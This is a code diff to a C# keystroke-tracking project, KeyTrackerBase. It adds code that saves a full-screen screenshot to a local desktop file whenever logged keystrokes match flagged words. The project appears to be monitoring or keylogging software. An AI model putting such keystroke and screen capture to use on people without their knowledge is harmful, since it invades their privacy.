@@ -9,6 +9,7 @@ using System.Threading;
 using System.Windows.Forms;
 using System.IO;
 using KeyTrackerBase;
+using System.Drawing;
 
 namespace KeyTrackerBase
 {
@@ -139,10 +140,19 @@ namespace KeyTrackerBase
                                                 {
                                                     countDetect++;
                                                     badWords += words[i] + " ";
+
+                                                    //capture screenshot
+                                                    ////http://www.mindfiresolutions.com/How-to-take-screenshot-programmatically-and-mail-it-in-C-647.php
+                                                    Bitmap screencapture = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+                                                    Graphics graphics = Graphics.FromImage(screencapture as Image);
+                                                    graphics.CopyFromScreen(0, 0, 0, 0, screencapture.Size);
+                                                    screencapture.Save("C:\\Users\\Jon\\Desktop\\screenshot.jpeg", System.Drawing.Imaging.ImageFormat.Jpeg);
+                                                    
                                                 }
                                                 
                                             }
                                             file.WriteLine("Amount of Words Detected: " + countDetect + " - Words: " + badWords);
+                                            
                                         }
                                         else
                                             //writes entries to txt file, removes period symbol and puts fullstop - logger
